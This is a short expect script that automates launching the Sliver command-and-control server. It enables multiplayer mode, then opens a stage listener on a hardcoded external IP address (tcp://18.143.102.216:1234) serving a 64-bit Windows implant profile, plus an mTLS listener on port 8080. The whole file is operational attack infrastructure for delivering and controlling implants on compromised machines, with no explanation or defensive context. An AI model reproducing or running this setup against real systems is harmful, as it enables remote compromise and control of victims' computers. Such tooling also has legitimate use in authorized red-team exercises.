#!/usr/bin/expect

# Ativate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

# Continue using sliver-server
send "multiplayer\r"
send "operators\r"
send "profiles\r"
send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
send "mtls -l 8080\r"
send "jobs\r"

interact